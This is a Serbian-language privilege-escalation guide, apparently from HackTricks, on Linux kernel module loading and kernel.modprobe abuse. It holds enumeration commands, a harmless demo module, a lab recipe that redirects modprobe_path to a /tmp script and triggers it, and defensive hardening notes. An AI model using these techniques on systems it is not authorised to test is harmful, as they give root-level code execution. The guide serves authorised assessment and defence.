# Zloupotreba Kernel Modules i modprobe

## Pogrešne konfiguracije Kernel Modules i učitavanja modula

Podrška za Kernel Modules predstavlja oblast sa velikim uticajem tokom provere Linux privilege escalation mogućnosti. Nemojte svaku poruku o nepotpisanom modulu automatski smatrati exploitable, već je koristite za odgovore na praktična pitanja.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Može li trenutni korisnik da učitava module putem `sudo`, capabilities ili writable helper putanje?
- Da li je učitavanje modula i dalje omogućeno?
- Da li je provera potpisa modula onemogućena?
- Da li su direktorijumi modula ili fajlovi modula writable?
- Da li se kernel logs mogu pročitati kako bi se potvrdilo šta se dogodilo?

Brzi triage počinje sledećim proverama statusa modula, potpisa, logginga i stabla modula.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Tumačenje:

- `modules_disabled=1` znači da moduli ne mogu ni da se učitaju ni da se uklone, a vrednost ne može da se vrati na `0` do ponovnog pokretanja sistema.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` u kernel komandnoj liniji ili `CONFIG_MODULE_SIG_FORCE=y` zahteva validno potpisane module; u suprotnom, nepotpisani moduli mogu da se učitaju i označe kernel kao tainted.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` ne nameće nikakvo ograničenje za `dmesg`; kada je vrednost `1`, pristup zahteva `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Putanje sa dozvolom za upis unutar `/lib/modules/$(uname -r)/` su opasne zato što `modprobe` pretražuje to stablo i podatke o zavisnostima prilikom učitavanja modula.<sup>[[8]](#references)</sup>

### Učitavanje modula i čitanje kernel izlaza

Ako imate legitimnu dozvolu da učitate lokalni modul, `insmod` umeće tačnu `.ko` datoteku koju navedete. Init funkcija modula se izvršava kao deo učitavanja, a poruke zapisane pomoću `printk()` dospevaju u kernel log bafer, koji se obično čita pomoću `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimalni workflow za proveru koristi `modinfo` za pregled metapodataka, `insmod` i `rmmod` za učitavanje i uklanjanje modula, `lsmod` za potvrdu da je modul učitan i `dmesg` za pregled kernel logova.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Ako `sudo -l` dozvoljava `insmod`, `modprobe` ili wrapper oko njih, tretirajte to kao kritično: `sudo -l` prikazuje privilegije korisnika koji ga poziva, a učitavanje kernel modula zahteva `CAP_SYS_MODULE`.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` dozvoljen preko sudo

Sudo pravilo koje korisniku dozvoljava da pokrene `insmod` ne može se porediti sa dozvolom za pokretanje uobičajenog administratorskog pomoćnog alata. Inicijalizacioni kod modula izvršava se kao deo učitavanja, pa je praktično pitanje pri proveri da li ovaj korisnik može da izabere ili izmeni modul koji se učitava.<sup>[[3]](#references)</sup>

Sledeći generički tok provere ponavlja provere inspekcije, učitavanja, stanja, zapisnika i uklanjanja za kandidatski modul.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Ako korisnik može da obezbedi proizvoljan `.ko`, to pravilo treba tretirati kao potpunu kompromitaciju sistema u okviru ovlašćene procene. Bezbedniji operativni obrazac je izbegavanje delegiranja učitavanja modula putem sudo; ako je to neizbežno, ograničite tačnu putanju, vlasništvo, dozvole, signing policy i proceduru uklanjanja.<sup>[[3]](#references)[[10]](#references)</sup>

Za bezopasan obrazac izgradnje modula u kontrolisanom labu, minimalni source i Makefile prikazani su u nastavku; forma `make -C /lib/modules/$(uname -r)/build M=$PWD` prati kernelov dokumentovani kbuild workflow za eksterne module.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Izgradite i učitajte samo u ovlašćenoj laboratoriji; kbuild izgrađuje eksterni modul, a komande load/remove pozivaju interfejse kernel modula.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Provere zloupotrebe `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` navodi userspace pomoćni program koji kernel izvršava za zahteve automatskog učitavanja modula; ovaj sysctl utiče na automatsko učitavanje, a ne na eksplicitno ubacivanje modula. Ako napadač može da ga promeni tako da pokazuje na izvršnu datoteku nad kojom ima dozvolu upisa i zatim pokrene zahtev za modulom, taj pomoćni program postaje privilegovani put za izvršavanje koda.<sup>[[1]](#references)</sup>

Proverite trenutnu putanju pomoćnog programa preko kernel sysctl interfejsa i proverite vlasništvo i režim dozvola cilja.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Proverite da li je moguće uticati na sysctl, delegirana sudo pravila ili file capabilities.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Sledeći obrazac namenjen je isključivo laboratoriji, menja putanju pomoćnog programa i pokreće dokumentovani zahtev za automatsko učitavanje modula; koristite ga samo na izolovanom sistemu za koji imate ovlašćenje.<sup>[[1]](#references)</sup>

Na aktuelnim Linux kernelima nemojte koristiti nepoznati izvršni fajl kao generički okidač: nasleđeno automatsko učitavanje modula za prilagođene binarne formate uklonjeno je u Linuxu 6.14, dok dokumentacija kernela navodi nepoznati tip filesystema kao putanju za zahtev za automatsko učitavanje modula.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Na hardened sistemima, ovo bi trebalo da ne uspe kada dozvole sprečavaju neprivilegovane upise u `kernel.modprobe`, putanja pomoćnog programa nije upisiva ili je automatsko učitavanje modula onemogućeno.<sup>[[1]](#references)</sup>

### Provera upisivog `/lib/modules`

Upisivi direktorijumi modula mogu omogućiti zamenu modula, ubacivanje zlonamernih modula ili zloupotrebu automatskog učitavanja, u zavisnosti od toga kako se `modprobe` kasnije poziva; `modprobe` pretražuje `/lib/modules/$(uname -r)` i koristi podatke o zavisnostima pri rešavanju modula.<sup>[[8]](#references)</sup>

Proverite upisive datoteke modula i metapodatke o zavisnostima/aliasima u stablu modula aktivnog izdanja kernela.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Ako pronađete sadržaj modula koji je moguće menjati, ispitajte kako `modprobe` rešava zavisnosti i kako `modinfo` prikazuje metapodatke modula.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Odbrambene napomene:

- Održavajte da `/lib/modules` bude u vlasništvu `root:root` i da korisnici nemaju dozvolu upisa.<sup>[[8]](#references)</sup>
- Postavite `kernel.modules_disabled=1` nakon pokretanja sistema tamo gde je to operativno moguće.<sup>[[1]](#references)</sup>
- Primenite potpisivanje modula na sistemima koji zahtevaju module koji se mogu učitati.<sup>[[2]](#references)</sup>
- Nadgledajte upise u `/proc/sys/kernel/modprobe`, `/lib/modules` i neočekivano izvršavanje `insmod`/`modprobe` komandi.<sup>[[1]](#references)[[8]](#references)</sup>

## References

- [1] [Dokumentacija za /proc/sys/kernel/ — Linux Kernel dokumentacija](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mogućnost potpisivanja Kernel modula — Linux Kernel dokumentacija](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux stranica priručnika](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Osnove upravljačkih programa — Linux Kernel dokumentacija](https://docs.kernel.org/driver-api/basics.html)
- [6] [Beleženje poruka pomoću printk — Linux Kernel dokumentacija](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Izgradnja eksternih modula — Linux Kernel dokumentacija](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux stranica priručnika](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Spajanje oznake 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/getcap.8.html)
{{#include ../../banners/hacktricks-training.md}}
